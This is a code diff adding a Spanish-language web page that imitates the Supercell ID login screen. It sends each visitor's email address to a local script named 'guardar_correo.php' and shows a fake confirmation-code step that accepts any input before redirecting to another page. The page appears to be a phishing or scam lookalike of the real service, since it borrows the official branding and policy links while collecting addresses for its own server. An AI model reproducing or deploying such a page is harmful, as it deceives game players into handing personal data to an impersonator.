@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Supercell ID Login</title>
+    <link rel="stylesheet" href="registro.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="Image/ID.png" alt="Supercell ID Logo" class="logo">
+            <div class="progress-bar">
+                <span class="progress"></span>
+            </div>
+            <img src="Image/LOGO.png" alt="Supercell ID Logo" class="logo">
+            <!-- Formulario de correo -->
+            <form id="login-form">
+                <h2 id="main-text">Continuar como Supercell Store</h2>
+                <p id="sub-text">Escribe tu correo electrónico y te enviaremos un código de confirmación.</p>
+                <input type="email" id="email-input" placeholder="Escribe tu correo electrónico" required>
+                <div class="g-recaptcha" data-sitekey="tu-clave-de-sitio"></div> <!-- reCAPTCHA -->
+                <p class="info-text">
+                    Esta página está protegida por reCAPTCHA y se aplican la 
+                    <a href="https://supercell.com/en/privacy-policy/es/">Política de Privacidad</a> y los 
+                    <a href="https://policies.google.com/terms">Términos del Servicio</a> de Google.
+                </p>
+                <button type="submit" class="btn-primary">INICIAR SESIÓN</button>
+                <button type="button" class="btn-secondary" onclick="cancelLogin()">CANCELAR</button>
+            </form>
+
+            <!-- Formulario para ingresar el código -->
+            <form id="code-form" style="display:none;">
+                <h2 id="main-text">Introduce el código</h2>
+                <p id="sub-text">Te hemos enviado un código de confirmación a tu correo electrónico.</p>
+                <input type="text" id="code-input" placeholder="Escribe el código" required>
+                <button type="submit" class="btn-primary">CONFIRMAR CÓDIGO</button>
+                <button type="button" class="btn-secondary" onclick="cancelLogin()">CANCELAR</button>
+            </form>
+
+            <p class="footer-text">
+                ¿Quieres crear un <a href="#" id="create-id-link">Supercell ID</a>?
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Función para enviar el correo y mostrar el formulario del código
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Obtener el correo
+            var email = document.getElementById("email-input").value;
+
+            // Realizar la llamada al servidor
+            fetch("guardar_correo.php", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+                body: "email=" + encodeURIComponent(email)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById("login-form").style.display = "none";
+                    document.getElementById("code-form").style.display = "block";
+                } else {
+                    alert("Hubo un error al enviar el código. Inténtalo nuevamente.");
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        });
+
+        // Manejar confirmación de código
+        document.getElementById("code-form").addEventListener("submit", function(event) {
+            event.preventDefault();
+            // Redirigir al nuevo index o hacer otra acción
+            window.location.href = "index2.html";
+        });
+
+        // Función para cancelar y volver a la pantalla de correo electrónico
+        function cancelLogin() {
+            document.getElementById("code-form").style.display = "none";
+            document.getElementById("login-form").style.display = "block";
+            document.getElementById("email-input").value = "";
+            document.getElementById("code-input").value = "";
+
+            const mainText = document.getElementById("main-text");
+            const subText = document.getElementById("sub-text");
+            mainText.innerHTML = "Continuar como Supercell Store";
+            subText.innerHTML = "Escribe tu correo electrónico y te enviaremos un código de confirmación.";
+        }
+    </script>
+</body>
+</html>
